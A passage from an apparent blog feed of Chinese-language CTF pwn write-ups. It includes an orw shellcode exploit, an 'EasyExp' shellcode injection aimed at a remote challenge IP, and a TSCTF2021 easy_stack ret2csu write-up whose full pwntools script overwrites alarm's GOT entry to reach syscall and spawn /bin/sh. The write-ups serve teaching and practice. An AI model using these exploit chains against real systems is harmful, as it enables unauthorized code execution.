punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"tent:"</span><span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span><span class="token comment"># chunk 1</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span><span class="token string">"-25"</span><span class="token punctuation">)</span> <span class="token comment"># free_got</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span><span class="token string">"8"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"tent:"</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span> <span class="token comment"># sys_read</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span>mypayload <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">38</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''sub rsp, 0x800push 0x67616c66mov rdi, rspxor esi, esimov eax, 2syscallcmp eax, 0js failedmov edi, eaxmov rsi, rspmov edx, 0x100xor eax, eaxsyscallmov edx, eaxmov rsi, rspmov edi, 1mov eax, edisyscalljmp exitfailed:push 0x6c696166mov edi, 1mov rsi, rspmov edx, 4mov eax, edisyscallexit:xor edi, edimov eax, 231syscall'''</span><span class="token punctuation">)</span>mypayload <span class="token operator">+=</span> shellcodep<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>mypayload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#flag&#123;151a5154-orw1-easy-1234-99bdsa23c7ds&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-EasyExp"><a href="#0x03-EasyExp" class="headerlink" title="0x03 EasyExp"></a>0x03 EasyExp</h2><p>做题的时候没注意，其实在判断是否输入完设定的chunk的长度size的时候，使用的方法是判断数组是否填满</p><p><strong>但是但是但是！！！</strong></p><p>判断逻辑如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> malloc_addr<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">++</span>v4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>malloc_addr <span class="token operator">==</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>malloc_addr <span class="token operator">==</span> <span class="token operator">&amp;</span>a1<span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> v4<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即如果输入的size为0，则可以输入无限多字节，不会被判定为数组填满：</p><p>则直接注入shellcode即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#EasyExp</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>os <span class="token operator">=</span> <span class="token string">'linux'</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment">#sh = process("./pwn")</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.105.131.68'</span><span class="token punctuation">,</span><span class="token string">'12354'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>\n"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:\n"</span><span class="token punctuation">,</span><span class="token string">'-25'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">''</span> payload <span class="token operator">+=</span> <span class="token string">'mov rax,0x67616c662f2e;'</span>payload <span class="token operator">+=</span> <span class="token string">'push rax;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rdi,rsp;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rax,2;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rsi,0;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rdx,0;'</span>payload <span class="token operator">+=</span> <span class="token string">'syscall;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rax,0;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rdi,3;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rsi,rsp;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rdx,0x40;'</span>payload <span class="token operator">+=</span> <span class="token string">'syscall;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rax,1;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rdi,1;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rsi,rsp;'</span>payload <span class="token operator">+=</span> <span class="token string">'mov rdx,0x40;'</span>payload <span class="token operator">+=</span> <span class="token string">'syscall;'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:\n'</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>\n"</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:\n'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TSCTF2021-easy_stack</title>
      <link href="//post/TSCTF2021-easy-stack.html"/>
      <url>//post/TSCTF2021-easy-stack.html</url>
      
        <content type="html"><![CDATA[<h1 id="TSCTF2021-pwn1-easy-stack"><a href="#TSCTF2021-pwn1-easy-stack" class="headerlink" title="TSCTF2021  pwn1 easy_stack"></a>TSCTF2021  pwn1 easy_stack</h1><h2 id="0x00-Pre"><a href="#0x00-Pre" class="headerlink" title="0x00 Pre"></a>0x00 Pre</h2><p>TSCTF2021的pwn1，涉及到ret2csu的多次复用和一点点汇编以及syscall的知识</p><span id="more"></span><h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><p>这题直接没给附件，只有ip，nc 连上去之后是一大段base64乱码，解码保存下是个xz压缩包，解压得到elf文件。</p><p>main函数很短，明显的栈溢出。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-D0h]</span>  __int64 stack_data<span class="token punctuation">;</span> <span class="token comment">// [rsp+C8h] [rbp-8h]</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">0xAu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  stack_data <span class="token operator">=</span> <span class="token number">0xDEADBEEFDEADBEEFLL</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x300uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> stack_1 <span class="token operator">!=</span> <span class="token number">0xDEADBEEFDEADBEEFLL</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>栈上布局也很简单：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">-00000000000000D0 buf             db 200 dup(?)-0000000000000008 stack_data      dq ?+0000000000000000  s              db 8 dup(?)+0000000000000008  r              db 8 dup(?)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>即只需要在read的时候入读200+8+8个字节，其中覆盖stack_data的时候填入0xDEADBEEFDEADBEEF，就可以控制返回地址。</p><p>没有其他函数可以利用，考虑使用 ret2csu</p><h2 id="0x02-解题思路"><a href="#0x02-解题思路" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h2><p>由于需要利用ret2csu，我们先分析下csu段：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0000000000400650                 mov     rdx, r15.text:0000000000400653                 mov     rsi, r14.text:0000000000400656                 mov     edi, r13d.text:0000000000400659                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8].text:000000000040065D                 add     rbx, 1.text:0000000000400661                 cmp     rbp, rbx.text:0000000000400664                 jnz     short loc_400650.text:0000000000400666.text:0000000000400666 loc_400666:                             ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400666                 add     rsp, 8.text:000000000040066A                 pop     rbx.text:000000000040066B                 pop     rbp.text:000000000040066C                 pop     r12.text:000000000040066E                 pop     r13.text:0000000000400670                 pop     r14.text:0000000000400672                 pop     r15.text:0000000000400674                 retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据ret2csu，我们需要先调用 <code>0x0000000000400666 - 0x0000000000400674</code>来控制寄存器</p><p>输入进寄存器的顺序为：pop rbx,rbp,r12,r13,r14,r15，</p><p>之后调用```0x0000000000400650``,使rdx = r15 ; rsi = r14 ; edi = r13d ; call [r12+rbx*8]</p><p>为了便于控制，我们令rbx = 0 使最后调用call r12 ，这样r12就是我们希望调用的函数。</p><p>而64位程序的函数调用时参数依次放入 rdi, rsi, rdx, rcx, r8, r9 </p><p>即我们利用csu时r13d为第一个参数（edi），r14，r15依次是第二个和第三个参数</p><p>这样一个利用csu的大概思路就有了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">csu_end_addr <span class="token operator">=</span> <span class="token number">0x400666</span>csu_front_addr <span class="token operator">=</span> <span class="token number">0x400650</span>def <span class="token function">csu</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> arg0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span><span class="token operator">:</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">pop</span> <span class="token expression">rbx<span class="token punctuation">,</span>rbp<span class="token punctuation">,</span>r12<span class="token punctuation">,</span>r13<span class="token punctuation">,</span>r14<span class="token punctuation">,</span>r15</span></span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">rbx</span> <span class="token expression">should be <span class="token number">0</span><span class="token punctuation">,</span></span></span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">rbp</span> <span class="token expression">should be <span class="token number">1</span><span class="token punctuation">,</span>enable not to jump</span></span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">r</span><span class="token expression"><span class="token number">12</span> should be the function we want to call</span></span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">rdi</span> <span class="token expression"><span class="token operator">=</span> edi <span class="token operator">=</span> r13d <span class="token operator">=</span>a rg0</span></span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">rsi</span> <span class="token expression"><span class="token operator">=</span> r14 <span class="token operator">=</span> arg1</span></span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">rdx</span> <span class="token expression"><span class="token operator">=</span> r15 <span class="token operator">=</span> arg2</span></span>    ret <span class="token operator">=</span> <span class="token function">p64</span><span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>arg0<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token function">p64</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">p64</span><span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>    ret <span class="token operator">+=</span> <span class="token function">p64</span><span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>    ret <span class="token operator">+=</span> <span class="token char">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>    <span class="token keyword">return</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时我们注意到main函数开头有个alarm函数，了解下alarm函数之后就能发现alarm函数是通过syscall实现的</p><p>libc中的alarm：</p><p><img src="https://pic.imgdb.cn/item/60c068e6844ef46bb276adc9.png"></p><p>了解下plt和got机制就能 知道，函数掉用alarm是会先<code>call &lt;alarm@plt&gt;</code>,而在<code>&lt;alarm@plt&gt;</code>中会调用<code>&lt;alarm@got&gt;</code>,</p><p>而got表中存放的地址就在libc中，这题我们没有write，没办法得到libc的基地址，但是原程序中的alarm调用会最终调用到libc中的alarm函数处，对libc中的alarm研究就能发现其实如果我们能使<code>&lt;alarm@got&gt;</code>中存放的alarm在libc中的真实地址+5 （即想我这里从原来的指向0x555555638610变成指向0x555555638615，具体数值由于开启了基地址随机保护会不定，但是alarm和syscall的最第三位是一定的）</p><p>即我们不需要泄露alarm的got表，只需要直接修改alarm的got使其+5即可使调用alarm时调用syscall函数，</p><p>syscall函数调用的时候系统调用号放在 rax 里，其中0x80为system，0x3b为execve。</p><p>而read函数正好可以控制 rax 寄存器</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span> buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//read()函数尝试从文件描述符fd中读取count个字节到buf开头的缓冲区中。返回读取的字符数到rax</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们一般见到的都是read(0,buf,size),这里fd为0代表标准输入流</p><p><strong>即从标准输入流中读取size个字节，将读取到的字符放入buf中，同时返回读取到的字节数到rax寄存器中</strong></p><p>这里我们就可以利用read修改rax寄存器以放入系统调用号，顺便修改alarm的got表。</p><p>现在我们可以构造payload了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xDEADBEEFDEADBEEF</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">200</span> <span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token comment"># p64()*(208/8)填满栈，再加一个p64()填充rbp</span><span class="token comment"># 填入stack中使满足if条件满足且填充rbp，劫持ret</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">+=</span> csu<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 从标准输入流0中读取1个字节放到alarm的got表中，然后ret等待下一个调用函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">+=</span> csu<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bss_start<span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">)</span>   <span class="token comment"># return 0x3b ==> rax</span><span class="token comment"># 从标准输入流0中读取0x3b个字节放到.bss段中，然后ret等待下一个调用函数</span><span class="token comment"># 这里选择read 0x3b个字节主要再能读取"/bin/sh"的前提下，使read的返回值为0x3b，read的返回值会放入rax中</span><span class="token comment"># 而对syscall来说，调用syscall时要调用的函数的函数调用号就放在rax里，0x3b代表execve函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">+=</span> csu<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"alarm"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment"># 调用got表中的alarm函数(实则会由read修改alarm的got表中的内容，这里调用alarm+5的syscall)</span><span class="token comment"># 调用之后第一个参数为.bss段上的内容，接下来将会由第二个read往里写入"/bin/sh"，第二个和第三个参数为0</span><span class="token comment"># 即最终调用execve("/bin/sh",0,0)来getshell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token comment"># 在main函数中的read读取0x300个字符，这我们在标准输入流中写满0x300个字符，之后这个read函数就会停止接收标准输入流</span><span class="token comment"># 但由于我们的ret2csu，输入完这0x300个字符之后就开始调用我们注入的csu函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 首先调用read(0,elf.got['alarm'],1),即输入一个字符写入alarm的got表</span>payload <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x15</span><span class="token punctuation">)</span> <span class="token comment"># 在标准输入流中输入一个十六进制为0x15的字节，修改alarm的got表</span><span class="token triple-quoted-string string">'''附上我本地libc的alarm真实汇编代码0x555555638610 &lt;alarm>   : mov eax，0x250x555555638615 &lt;alarm+5> : syscall即alarm的got表中的内容应为0x555555638610（后三位固定）我们只需要将最后改为0x555555638615，这样函数调用alarm的时候就会调用syscall，即往alarm的got表写入0x15'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 上一个read调用完之后来到下一个csu函数</span><span class="token comment"># read(0, bss_start, 0x3b)</span><span class="token comment"># 在标准输入流中读取0x3b个字符，写入.bss段，故我们需要输入我们需要的"/bin/sh"字符串</span>payload <span class="token operator">+=</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token comment"># 这样bss段就会写入"/bin/sh"同时由于read返回输入的字节数，我们读入了0x3b个字节，rax寄存器就会被设置成0x3b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 接着继续调用我们注入的csu函数，即elf.got['alarm']</span><span class="token comment"># 而由于我们的修改alarm的got表指向syscall，此时调用syscall会调用rax寄存器里函数调用号所代表的函数</span><span class="token comment"># 上一个read的返回值使rax此时的值为0x3b，在64位系统中代表execve</span><span class="token comment"># 即此时调用execve(bss_start, 0, 0),由于我们往bss_start填入了"/bin/sh"</span><span class="token comment"># 故最终调用execve("/bin/sh", 0, 0)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># getshell!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>csu_end_addr <span class="token operator">=</span> <span class="token number">0x400666</span>csu_front_addr <span class="token operator">=</span> <span class="token number">0x400650</span>bss_start <span class="token operator">=</span> <span class="token number">0x601040</span><span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> arg0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># pop rbx,rbp,r12,r13,r14,r15</span>    <span class="token comment"># rbx should be 0,</span>    <span class="token comment"># rbp should be 1,enable not to jump</span>    <span class="token comment"># r12 should be the function we want to call</span>    <span class="token comment"># rdi=edi=r13d=arg0</span>    <span class="token comment"># rsi=r14=arg1</span>    <span class="token comment"># rdx=r15=arg2</span>    ret <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>arg0<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span>    ret <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>    ret <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>    <span class="token keyword">return</span> retpayload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xDEADBEEFDEADBEEF</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">200</span> <span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> csu<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> csu<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bss_start<span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">)</span>   <span class="token comment"># return 0x3b ==> rax</span>payload <span class="token operator">+=</span> csu<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"alarm"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p8<span class="token punctuation">(</span><span class="token number">0x15</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-Off_by_Null</title>
      <link href="//post/pwn-Off-by-Null.html"/>
